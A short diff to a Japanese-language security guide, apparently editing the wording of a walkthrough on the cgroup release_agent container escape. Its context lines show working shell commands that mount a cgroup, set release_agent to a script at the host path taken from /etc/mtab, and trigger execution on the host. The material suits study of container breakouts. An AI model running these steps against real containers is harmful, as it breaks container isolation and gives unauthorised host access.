@@ -27,8 +27,8 @@ mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 echo 1 > /tmp/cgrp/x/notify_on_release
 ```
 3. **リリースエージェントの設定:**
-- ホスト上のコンテナのパスは、/etc/mtab ファイルから取得されます。
-- 次に、cgroup の release_agent ファイルが、取得したホストパスにある /cmd という名前のスクリプトを実行するように設定されます。
+- ホスト上のコンテナのパスは、/etc/mtabファイルから取得されます。
+- 次に、cgroupのrelease_agentファイルが、取得したホストパスにある/cmdという名前のスクリプトを実行するように設定されます。
 ```shell
 host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 echo "$host_path/cmd" > /tmp/cgrp/release_agent
@@ -42,7 +42,7 @@ chmod a+x /cmd
 ```
 5. **攻撃をトリガーする:**
 - "x" 子 cgroup 内でプロセスが開始され、すぐに終了します。
-- これにより `release_agent`（/cmd スクリプト）がトリガーされ、ホスト上で ps aux が実行され、その出力がコンテナ内の /output に書き込まれます。
+- これにより `release_agent`（/cmd スクリプト）がトリガーされ、ホスト上で ps aux を実行し、その出力をコンテナ内の /output に書き込みます。
 ```shell
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 ```
